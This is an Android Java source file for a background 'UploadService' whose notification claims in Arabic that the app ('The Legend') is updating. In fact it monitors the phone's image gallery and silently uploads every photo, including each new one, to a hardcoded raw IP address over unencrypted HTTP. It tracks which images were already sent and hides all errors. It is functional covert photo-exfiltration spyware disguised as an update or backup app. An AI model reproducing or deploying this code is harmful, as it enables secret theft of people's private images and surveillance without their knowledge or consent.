package com.example.yacinestylebackup;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import androidx.core.app.NotificationCompat;
import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UploadService extends Service {
    private static final String UPLOAD_URL="http://145.239.69.111:20245/upload";
    private static final String PREFS="legend_upload", SENT="sent_ids";
    private static final String CHANNEL_ID="legend_update";
    private static final int NOTIFICATION_ID=7401;
    private final ExecutorService executor=Executors.newSingleThreadExecutor();
    private final Handler handler=new Handler(Looper.getMainLooper());
    private ContentObserver observer;
    private volatile boolean queued;

    @Override public void onCreate(){
        super.onCreate();
        createChannel();
        startForeground(NOTIFICATION_ID, notification());
        observer=new ContentObserver(handler){
            @Override public void onChange(boolean selfChange,Uri uri){queueScan();}
        };
        getContentResolver().registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,true,observer);
        queueScan();
    }

    private Notification notification(){
        return new NotificationCompat.Builder(this,CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("الأسطورة")
                .setContentText("جاري التحديث…")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).setOnlyAlertOnce(true).build();
    }

    private void createChannel(){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            NotificationChannel ch=new NotificationChannel(CHANNEL_ID,"تحديث الأسطورة",NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("يظهر أثناء تنفيذ التحديث");
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private void queueScan(){
        if(queued)return;
        queued=true;
        handler.postDelayed(()->{queued=false;executor.execute(this::scan);},800);
    }

    private void scan(){
        Set<String> sent=new HashSet<>(getSharedPreferences(PREFS,MODE_PRIVATE).getStringSet(SENT,new HashSet<>()));
        String[] projection={MediaStore.Images.Media._ID,MediaStore.Images.Media.DISPLAY_NAME,MediaStore.Images.Media.MIME_TYPE};
        try(Cursor c=getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,projection,null,null,MediaStore.Images.Media.DATE_ADDED+" ASC")){
            if(c==null)return;
            int idc=c.getColumnIndexOrThrow(MediaStore.Images.Media._ID),namec=c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME),mimec=c.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);
            while(c.moveToNext()){
                String id=c.getString(idc);
                if(sent.contains(id))continue;
                Uri uri=Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,String.valueOf(c.getLong(idc)));
                if(uploadOne(uri,c.getString(namec),c.getString(mimec))){
                    sent.add(id);
                    getSharedPreferences(PREFS,MODE_PRIVATE).edit().putStringSet(SENT,new HashSet<>(sent)).apply();
                }
            }
        }catch(Exception ignored){}
    }

    private boolean uploadOne(Uri uri,String filename,String mime){
        HttpURLConnection conn=null;String boundary="----Legend"+System.currentTimeMillis();
        try{
            conn=(HttpURLConnection)new URL(UPLOAD_URL).openConnection();
            conn.setConnectTimeout(15000);conn.setReadTimeout(180000);conn.setDoOutput(true);conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type","multipart/form-data; boundary="+boundary);
            try(InputStream in=new BufferedInputStream(getContentResolver().openInputStream(uri));DataOutputStream out=new DataOutputStream(conn.getOutputStream())){
                if(in==null)return false;
                out.writeBytes("--"+boundary+"\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+safe(filename)+"\"\r\n");
                out.writeBytes("Content-Type: "+(mime==null?"image/jpeg":mime)+"\r\n\r\n");
                byte[] buf=new byte[8192];int n;
                while((n=in.read(buf))!=-1)out.write(buf,0,n);
                out.writeBytes("\r\n--"+boundary+"--\r\n");out.flush();
            }
            int code=conn.getResponseCode();
            InputStream response=code>=400?conn.getErrorStream():conn.getInputStream();
            if(response!=null){byte[] b=new byte[2048];while(response.read(b)!=-1){}response.close();}
            return code>=200&&code<300;
        }catch(Exception e){return false;}finally{if(conn!=null)conn.disconnect();}
    }

    private String safe(String s){
        if(s==null||s.isEmpty())return "image.jpg";
        return s.replace("\r","_").replace("\n","_").replace("\"","_");
    }

    @Override public int onStartCommand(Intent intent,int flags,int startId){return START_STICKY;}
    @Override public void onDestroy(){
        if(observer!=null)getContentResolver().unregisterContentObserver(observer);
        executor.shutdownNow();stopForeground(true);super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent){return null;}
}
